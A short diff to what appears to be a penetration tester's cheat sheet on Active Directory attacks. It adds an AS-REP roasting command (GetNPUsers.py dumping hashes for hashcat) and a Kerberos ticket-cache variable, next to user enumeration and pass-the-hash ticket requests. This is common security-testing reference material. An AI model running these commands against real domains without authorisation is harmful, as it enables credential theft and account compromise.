@@ -100,6 +100,7 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 
 ```shell
 python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
+python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -format hashcat -outputfile <hashes>
 ```
 
 change password (STATUS_PASSWORD_MUST_CHANGE)
@@ -285,6 +286,7 @@ sudo ntpdate <target ip>
 getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<user>
 # Kerberos credentials cache
 export KRB5CCNAME=<username>@<domain>.ccache
+export KRB5CCNAME=<TGT_ccache_file>
 # showing Kerberos credentials cache
 klist
 # login method1
